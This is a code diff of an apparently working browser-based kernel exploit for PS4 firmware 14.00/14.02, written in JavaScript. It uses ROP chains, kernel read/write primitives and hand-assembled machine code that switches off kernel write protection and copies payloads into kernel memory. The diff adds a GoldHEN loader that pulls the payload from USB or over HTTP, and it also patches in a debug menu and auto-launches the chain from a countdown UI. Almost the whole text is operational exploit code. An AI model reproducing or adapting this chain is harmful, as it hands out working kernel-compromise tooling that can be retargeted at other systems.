-    for(let i=0;i<=10;i++){let q=k.read_v(plus(from,i*8));if(!q){say("[t] "+what+" unreadable at +0x"+(i*8).toString(16));return false}
+    for(let i=0;i<=10;i++){let q=k.read_v(plus(from,i*8));if(!q){say("[t] "+what+" unreadable");return false}
       if(i===7)q=stub;
       if(!k.write_v(plus(to,i*8),q)){say("[t] "+what+" not writable");return false}}
     const c=k.read_v(plus(to,0x38));return c!==null&&same(c,stub)};
@@ -889,7 +897,6 @@ function teardown(k,kbase,ofs,devs,queues,room){
     for(let i=0;i<list.length;i++){const f=fileOf(list[i]);const cur=(f&&inHeap(f))?k.read_v(plus(f,0x08)):null;
       if(cur&&same(cur,copy))m++;else if(cur&&from&&same(cur,from)&&k.write_v(plus(f,0x08),copy))m++}
     return m};
-  say("[t] looking for device table across "+devs.length+" handles");
   const devOps=original(devs,dtab);
   if(devOps){if(!ready(dtab)&&!clone(devOps,dtab,"device table"))return false}
   else if(!ready(dtab)){say("[t] no device table to copy");return false}
@@ -915,15 +922,12 @@ function teardown(k,kbase,ofs,devs,queues,room){
   say("[t] "+left+" handles still on original");
   return false;
 }
-
-/* ============ PATCHSET / KPAYLOAD STEP DRIVER ============ */
 async function fetchBytes(url,tag){
   try{const r=await fetch(url+(url.indexOf("?")<0?"?":"&")+"_="+Date.now());
     if(!r.ok){say("["+tag+"] "+url+" HTTP "+r.status);return null}
     return new Uint8Array(await r.arrayBuffer());
   }catch(e){say("["+tag+"] "+url+" unreachable: "+(e&&e.message));return null}
 }
-
 async function runPatchSet(room){
   const c=host();
   let pset=null;
@@ -936,17 +940,121 @@ async function runPatchSet(room){
   say("[g] [0] kernel patch set rc=0x"+((pr&&pr.lo>>>0)||0).toString(16));
   return true;
 }
-
-const KP_STEPS=[
-  [0x11bd1,"init: firmware detect + import/offset tables"],
-  [0x5cf3,"patch group 1"],
-  [0xa65,"patch group 2"],
-  [0x10b2,"patch group 3"],
-  [0x2b6d,"patch group 4 (testkit + shell)"],
-  [0x256e,"patch group 5 (syscalls 11/c5/c6)"],
-  [0x3426,"patch group 6 (54 kernel patches + exec handler)"]
-];
-
+function readFromUSB(filename){
+  const mounts=["/mnt/usb0/","/mnt/usb1/"];
+  for(let m=0;m<mounts.length;m++){
+    const full=mounts[m]+filename;const p=cstr(full);
+    const fd=sc(S.open,p.at,0).i32;
+    if(fd<0)continue;
+    const end=sc(S.lseek,fd,0,2);const size=end.lo>>>0;
+    if(size===0||size>0x200000){sc(S.close,fd);continue}
+    sc(S.lseek,fd,0,0);const buf=alloc(size);let off=0;
+    while(off<size){const want=Math.min(size-off,0x10000);const got=sc(S.read,fd,plus(buf.at,off),want).i32;if(got<=0)break;off+=got}
+    sc(S.close,fd);
+    if(off<size)continue;
+    say("[usb] "+size+" bytes loaded from "+full);
+    return buf.u8.slice(0,size);
+  }
+  return null;
+}
+async function loadEnabler(url,k,kbase,room){
+  let blob=readFromUSB("goldhen.bin");
+  if(blob)say("[e] "+blob.length+" bytes from USB");
+  else blob=await fetchBytes(url,"e");
+  if(blob===null||!blob)return false;
+  if(blob.length===GH.nlOff+GH.nlLen){
+    say("[e] "+blob.length+" bytes -- composite image, patch chain path");
+    return loadGoldhen(url,k,kbase,room,blob);
+  }
+  if(blob.length&&blob[0]===0xe9){
+    say("[e] "+blob.length+" bytes, leading jmp -- raw payload path");
+    return loadPayload(url,blob);
+  }
+  say("[e] "+blob.length+" bytes: neither composite ("
+      +(GH.nlOff+GH.nlLen)+") nor raw (leading jmp) -- refusing");
+  return false;
+}
+async function loadGoldhen(url,k,kbase,room,vorab){
+  const c=host();
+  let blob=vorab||null;
+  if(blob===null){blob=await fetchBytes(url,"g");if(blob===null)return false}
+  if(blob.length!==GH.nlOff+GH.nlLen){
+    say("[g] "+blob.length+" bytes, expected "+(GH.nlOff+GH.nlLen)+" -- wrong image");
+    return false;
+  }
+  const size=(blob.length+0x4fff)&~0xfff;
+  const m=sc(S.mmap,0,size+0x1000,3,0x1002,-1,0);
+  const buf=v(m.lo,m.hi);
+  if(m.i32===-1||(buf.hi>>>0)===0){say("[g] mmap failed, errno "+c.errno());return false}
+  for(let o=0;o<=size;o+=0x1000)wr4(plus(buf,o),0);
+  if(sc(S.mprotect,buf,size+0x1000,7).i32!==0){say("[g] mprotect rwx failed, errno "+c.errno());return false}
+  codeAt(buf,GH.tor).hex("4831c0").hex("4989ca").hex("0f05").hex("c3");
+  codeAt(buf,GH.tram+0x200).hex("c3");
+  const r3=c.callAddr(plus(buf,GH.tram+0x200),[]);
+  if(r3===undefined||r3===null){say("[g] trampoline does not execute even in ring 3 -- stopping");return false}
+  say("[g] trampoline page executes in ring 3, so ring 0 may follow");
+  for(let o=0;o<blob.length;o+=8){let lo=0,hi=0;
+    for(let k2=0;k2<4;k2++)lo|=(blob[o+k2]||0)<<(8*k2);
+    for(let k2=0;k2<4;k2++)hi|=(blob[o+4+k2]||0)<<(8*k2);
+    c.p.write8(plus(buf,o),v(lo>>>0,hi>>>0))}
+  say("[g] "+blob.length+" bytes at "+text(buf));
+  const gate=codeAt(buf,GH.tor);
+  gate.hex("4831c0").hex("4989ca").hex("0f05").hex("c3");
+  let t=null;
+  const tram={n:0};
+  const b1=function(x){wr1(plus(buf,GH.tram+tram.n),x);tram.n++};
+  const hex=function(h){const u=unhex(h);for(let i=0;i<u.length;i++)b1(u[i])};
+  const i32=function(n){for(let k2=0;k2<4;k2++)b1(Math.floor(n/Math.pow(256,k2))%256)};
+  const q64=function(q){i32(q.low>>>0);i32(q.hi>>>0)};
+  const callAbs=function(rva){hex("48b8");q64(plus(t,rva));hex("ffd0")};
+  const wpOff=function(){hex("0f20c0");hex("4825");i32(0xfffeffff);hex("0f22c0")};
+  const wpOn=function(){hex("0f20c0");hex("480d");i32(0x00010000);hex("0f22c0")};
+  const fire=function(){const r=c.callAddr(plus(buf,GH.tor),[11,plus(buf,GH.tram)]);return r.lo>>>0};
+  const markClear=function(s2){wr4(plus(buf,GH.mark+s2*8),0xDEADBEEF);wr4(plus(buf,GH.mark+s2*8+4),0xDEADBEEF)};
+  const markRead=function(s2){return[rd4(plus(buf,GH.mark+s2*8)),rd4(plus(buf,GH.mark+s2*8+4))]};
+  if(!(await runPatchSet(room)))return false;
+  const kb=kbase;
+  t=plus(kb,GH.rvaPad);
+  wr8(plus(buf,GH.kptr),plus(kb,GH.rvaKmem));
+  say("[g] kernel base "+text(kb)+" (from the exploit), padding "+text(t));
+  if(!paddingRW(k,kb)){say("[g] stopping: the padding would stay read only");return false}
+  tram.n=0;wpOff();
+  hex("48be");q64(plus(buf,GH.nlOff));
+  hex("48bf");q64(t);
+  hex("b9");i32(GH.nlLen);
+  hex("fc");hex("f3a4");wpOn();
+  hex("b8");i32(0x5758);hex("c3");
+  const cp=fire();
+  if(cp!==0x5758){say("[g] copy into the padding returned 0x"+cp.toString(16));return false}
+  say("[g] [3] "+GH.nlLen+" bytes into the padding");
+  let good=0,silent=0;
+  for(let n=0;n<GH_STEPS.length;n++){
+    const rva=GH_STEPS[n][0],what=GH_STEPS[n][1],o=GH_STEPS[n][2]||{};
+    markClear(0);tram.n=0;wpOff();
+    if(o.rdi!==undefined){hex("48bf");q64(plus(t,o.rdi))}
+    if(o.esi!==undefined){hex("be");i32(o.esi)}
+    hex("31c0");
+    if(o.ptr){hex("48b8");q64(plus(t,rva));hex("488b00");hex("ffd0")}
+    else callAbs(rva);
+    hex("4898");
+    hex("48b9");q64(plus(buf,GH.mark));
+    hex("488901");
+    wpOn();hex("31c0");hex("c3");
+    fire();
+    const mk=markRead(0);
+    if(mk[1]===0xDEADBEEF){
+      say("[g] ["+(n+1)+"] 0x"+rva.toString(16)+" did NOT come back -- "+what);
+      silent++;
+    }else{
+      let rc=mk[0];if(mk[1]===0xffffffff)rc=mk[0]-0x100000000;
+      good++;
+      if(rc!==0)say("[g] ["+(n+1)+"] 0x"+rva.toString(16)+" rc="+rc+(rc===3?" (target already injected)":""));
+      else say("[g] ["+(n+1)+"] 0x"+rva.toString(16)+" rc=0 -- "+what);
+    }
+  }
+  say("[g] "+good+" of "+GH_STEPS.length+" calls returned, "+silent+" silent");
+  return silent===0;
+}
 async function loadKpayloadSteps(k,kbase,room){
   const c=host();
   const blob=await fetchBytes("kpayload.bin","kp");
@@ -1015,13 +1123,6 @@ async function loadKpayloadSteps(k,kbase,room){
   say("[kp] kpayload patch chain finished, "+silent+" silent");
   return silent===0;
 }
-
-/* ============ loadPayload (CORRIGIDO) ============
-   Mudanças:
-   - removido readFromUSB("payload.bin") hardcoded (usava arquivo errado)
-   - removidos NOPs em 0x3490 (M_TEMP) e 0x1136 (kpayload entry) que matavam o payload
-   - mantido só o NOP em 0x1068 (console_output, legítimo)
-   ================================================ */
 async function loadPayload(url,vorab){
   const c=host();
   let blob=vorab||null;
@@ -1047,8 +1148,6 @@ async function loadPayload(url,vorab){
     for(let k=0;k<4;k++)hi|=(blob[o+4+k]||0)<<(8*k);
     const q=c.p.read8(plus(entry,o));
     if((q.low>>>0)!==(lo>>>0)||(q.hi>>>0)!==(hi>>>0)){say("[p] copy mismatch at 0x"+o.toString(16));return false}}
-  /* Só o NOP de console_output (legítimo). Os de 0x3490 e 0x1136 foram REMOVIDOS
-     porque matavam o payload antes dele executar. */
   for(let o=0;o<10;o++)wr1(plus(entry,0x1068+o),0x90);
   say("[p] console_output NOP'd (0x1068) -- payload intacto");
   const SLOT_1352=0x3cb9c00;
@@ -1056,7 +1155,7 @@ async function loadPayload(url,vorab){
   if(!c.webkitBase||!c.libkernelBase){say("[p] no module bases");return false}
   const fnr=c.p.read8(c.webkitBase.add32(slot));const fn=v(fnr.low,fnr.hi);
   const d=(fn.hi-(c.libkernelBase.hi>>>0))*LOW+(fn.low-(c.libkernelBase.low>>>0));
-  if((fn.hi>>>0)!==(c.libkernelBase.hi>>>0)||d<=0||d>0x400000){say("[p] pthread slot bad -- "+text(fn)+" not inside libkernel");return false}
+  if((fn.hi>>>0)!==(c.libkernelBase.hi>>>0)||d<=0||d>0x400000){say("[p] pthread slot bad -- "+text(fn));return false}
   say("[p] pthread_create at "+text(fn)+" = libkernel +0x"+d.toString(16));
   const thr=alloc(8);thr.u8.fill(0);
   const rc=c.callAddr(fn,[thr.at,0,entry,0]).i32;const handle=qAt(thr,0);
@@ -1064,8 +1163,6 @@ async function loadPayload(url,vorab){
   say("[p] "+blob.length+" bytes at "+text(entry)+", thread rc="+rc+(started?" -- running":" -- did NOT start"));
   return started;
 }
-
-/* ============ PROBE ============ */
 function probeAfterglow(ctx){
   STATE.ctx=ctx;const out={ok:false,reasons:[]};const no=function(why){out.reasons.push(why)};
   const noStub=seedStubs();
@@ -1121,33 +1218,24 @@ function probeAfterglow(ctx){
   if(out.ok)say("probe VERDICT usable");else for(const r of out.reasons)say("probe BLOCKED "+r);
   return out;
 }
-
-/* ============ ATTEMPT (com guard de firmware) ============ */
 async function attempt(ctx,opts){
   STATE.ctx=ctx;opts=opts||{};STATE.retry=false;
-
-  /* CORREÇÃO: guard de firmware ANTES de tocar no kernel */
   const ua=(navigator.userAgent||"");
   const fwMatch=ua.match(/PlayStation\s+4[\/ ](\d+)\.(\d+)/);
-  if(!fwMatch){
-    say("[0] UA sem 'PlayStation 4' -- não é PS4 ou formato desconhecido");
-    return false;
-  }
+  if(!fwMatch){say("[0] UA sem 'PlayStation 4'");return false}
   const major=parseInt(fwMatch[1],10);
   const minorHex=parseInt(fwMatch[2],16);
   const fwStr=major+"."+minorHex.toString(16).padStart(2,"0");
   say("[0] firmware detectada: "+fwStr+" (raw="+fwMatch[1]+"."+fwMatch[2]+")");
   if(fwStr!=="14.00" && fwStr!=="14.02"){
-    say("[0] FIRMWARE NAO SUPORTADA ("+fwStr+") -- abortando ANTES de tocar no kernel");
-    say("[0] este exploit só funciona em 14.00 ou 14.02 EXATOS");
+    say("[0] FIRMWARE NAO SUPORTADA ("+fwStr+") -- abortando");
     return false;
   }
-
   say("afterglow -- ps4 kernel exploit, firmware "+fwStr);
   const missing=seedStubs();
-  if(missing.length){say("  no libkernel stub for "+missing.join(",")+" -- stopping");return false}
+  if(missing.length){say("  no libkernel stub for "+missing.join(","));return false}
   const pin=pinCore();
-  if(!pin.ok){say("  cpu pin failed ("+pin.note+") -- refusing to go on.");return false}
+  if(!pin.ok){say("  cpu pin failed ("+pin.note+")");return false}
   say("  pinned to core "+pin.core+" of ["+pin.allowed+"]");
   {
     const m0=sc(S.mmap,0,0x4000,3,0x1002,-1,0);
@@ -1185,7 +1273,7 @@ async function attempt(ctx,opts){
       for(const b in tally){const n=tally[b];if(n>top){second=top;best=Number(b);top=n}else if(n>second)second=n}
       if(best!==null&&top>second)voted=v(best+K.anchor,0xffffffff);
     }
-    if(found&&voted&&!same(found,voted)){say("[1] readings disagree: "+text(found)+" vs "+text(voted)+" -- stopping");return false}
+    if(found&&voted&&!same(found,voted)){say("[1] readings disagree");return false}
     found=found||voted;
     if(found&&((found.low-K.anchor)>>>0)%0x4000!==0){const rem=((found.low-K.anchor)>>>0)%0x4000;const delta=rem<=0x2000?rem:-(0x4000-rem);const oldA=K.anchor;K.anchor+=delta;say("[1] anchor grid-shifted "+delta+": 0x"+oldA.toString(16)+" -> 0x"+K.anchor.toString(16))}
     say("[1] leak: queue="+r+" sprays="+shot.sprayed+" anchor="+(found?text(found):"missed")+((found&&voted&&same(found,voted))?" (both agree)":""));
@@ -1232,7 +1320,7 @@ async function attempt(ctx,opts){
   },merged?0x1000+reach*0x100:0x1000);
   const file=qAt(note,40),ops=qAt(note,48);
   say("[3] chain="+(r2===null?("null -- "+shot.why):r2)+" file="+text(file)+" ops="+text(ops));
-  if(!inHeap(file)||!inText(ops)){say("    handles implausible -- nothing written");STATE.retry=true;return false}
+  if(!inHeap(file)||!inText(ops)){say("    handles implausible");STATE.retry=true;return false}
   let sane=0;for(let k=0;k<10;k++)if(inText(qAt(ftab,k*8)))sane++;
   if(sane<6){say("    op table unusable, "+sane+" of 10");return false}
   let r2b=-1;
@@ -1244,7 +1332,7 @@ async function attempt(ctx,opts){
       c.follow(0x168);c.gad("load8");walkLoop(c);
     },0x1000+reach*0x100);
     say("[3b] address space walked, chain="+(r2b===null?("null -- "+shot.why):r2b));
-    if(!ran(r2b)){say("    chain did not run -- hole refilled");STATE.retry=true;return false}
+    if(!ran(r2b)){say("    chain did not run");STATE.retry=true;return false}
   }
   let hit=null,walked=0;
   for(let k=0;k<reach;k++){
@@ -1268,7 +1356,7 @@ async function attempt(ctx,opts){
   const wTable=alloc(16);pokeAt(wTable,0,ftab.at);pokeAt(ftab,0x18,hostFree);
   const r3=shot.take(function(c){c.put(plus(here,0x5c),wRights.at,4);c.put(plus(file,0x08),wTable.at,8)});
   say("[5] widen and hook: "+(r3===null?("null -- "+shot.why):r3));
-  if(!ran(r3)){say("    chain did not run -- kernel untouched");STATE.retry=true;return false}
+  if(!ran(r3)){say("    chain did not run");STATE.retry=true;return false}
   if(sc(S.mprotect,hostPage,0x1000,7).i32!==0){say("    page did not turn writable");return false}
   const boot=unhex(BOOTSTRAP);
   if(K.anchor===0xe6c30){for(let bi=0;bi<boot.length-6;bi++){
@@ -1345,8 +1433,6 @@ async function attempt(ctx,opts){
   say("[10] kernel interface is live -- "+shot.devs.length+" handles held open");
   iface.defused=teardown(k,kbase,ofs,shot.devs,shot.queues,hostFree);
   say(iface.defused?"handles defused -- this page may close":"the handles are NOT defused -- do not let this page close");
-
-  /* ============ DEBUG SETTINGS ============ */
   (function(){
     const TEXT_SIZE=0xCFE880,DATA_OFF=0x1520000;
     const c=k.begin();
@@ -1366,9 +1452,9 @@ async function attempt(ctx,opts){
     c2.hex("49ba").qw(plus(k.at,OUT));c2.hex("498902");
     if(!k.run())return;
     const hit=k.out();
-    if(!hit||isZero(hit)){say("[dbg] no data reference to the string");return}
+    if(!hit||isZero(hit)){say("[dbg] no data reference");return}
     const fn=k.read_v(plus(hit,0x08));
-    if(!fn||isZero(fn)){say("[dbg] no handler in oid_name");return}
+    if(!fn||isZero(fn)){say("[dbg] no handler");return}
     const fnRva=(fn.low-kbase.low)>>>0;
     if(fnRva>=TEXT_SIZE){say("[dbg] handler outside text");return}
     const body=k.read(fn,80);
@@ -1397,12 +1483,12 @@ async function attempt(ctx,opts){
     k.apply(kbase,plist);
     say("[dbg] debug menu enabled -- check Settings");
   })();
-
-  /* ============ PAYLOAD ============ */
   const want=(ctx.params&&ctx.params.get("payload"));
   const mode=(ctx.params&&ctx.params.get("mode"))||"";
   if(mode==="kpstep"){
     iface.payload=await loadKpayloadSteps(k,kbase,hostFree);
+  }else if(mode==="goldhen"){
+    iface.payload=await loadEnabler(want||"goldhen.bin",k,kbase,hostFree);
   }else if(want!==""){
     iface.payload=await loadPayload(want||"hen.bin");
   }
@@ -1410,7 +1496,6 @@ async function attempt(ctx,opts){
   say("  JAILBREAK COMPLETE -- FW "+fwStr);
   return iface;
 }
-
 async function runAfterglow(ctx,opts){
   const max=(opts&&opts.tries)||4;
   for(let n=1;n<=max;n++){
@@ -1428,7 +1513,6 @@ return{probeAfterglow,runAfterglow};
 
 /* ============ BOOTSTRAP UI ============ */
 (async function(){
-  /* matrix */
   (()=>{const c=document.getElementById("matrix"),x=c.getContext("2d");
     const L="0123456789ABCDEF",S=14;let drops=[];
     const resize=()=>{c.width=innerWidth;c.height=innerHeight;drops=new Array(Math.ceil(c.width/S)).fill(1)};
@@ -1449,9 +1533,7 @@ return{probeAfterglow,runAfterglow};
   const isPS4=/PlayStation 4/.test(navigator.userAgent);
   const startBtn=document.getElementById("startBtn");
   const hint=document.getElementById("hint");
-
-  /* CORREÇÃO: default seguro = payload=hen.bin, NÃO mode=kpstep */
-  const RUN_URL="?afterglow=run&log=1&payload=hen.bin&g=drain:16&g=drainsz:0x4000&v=1402s";
+  const RUN_URL="?afterglow=run&log=1&mode=goldhen&g=drain:16&g=drainsz:0x4000&v=1402s";
   function landing(label,hintText,onClick){startBtn.textContent=label;startBtn.disabled=!onClick;startBtn.onclick=onClick||null;hint.textContent=hintText}
 
   if(!isPS4){landing("🚫 PS4 APENAS","Abra no navegador do PlayStation 4.",null);return}
@@ -1478,7 +1560,6 @@ return{probeAfterglow,runAfterglow};
   landing("▶ INICIAR ("+n+")","Toque para começar agora.",launch);
   const iv=setInterval(()=>{n--;if(n<=0){clearInterval(iv);launch();return}startBtn.textContent="▶ INICIAR ("+n+")"},1000);
 
-  /* ============ jb-g body ============ */
   async function runJB(){
     const outEl=document.getElementById("out");
     const stateEl=document.getElementById("state");
@@ -1607,7 +1688,6 @@ return{probeAfterglow,runAfterglow};
         return{lo:M.frameDv.getUint32(0,true),hi:M.frameDv.getUint32(4,true),i32:M.frameDv.getUint32(0,true)|0};
       }
       const errno=()=>{const r=callAddr(errorFn,[]);const a=new int64(r.lo,r.hi);if(a.hi===0&&a.low===0)return -1;return p.read4(a)|0};
-
       if(params.get("afterglow")){
         const agCtx={p,callAddr,bufAddr,errno,params,keepAlive,mark,state,libkernelBase,webkitBase,stubAddr,off,prepareMany,runPrepared};
         if(params.get("afterglow")==="probe"){Afterglow.probeAfterglow(agCtx)}
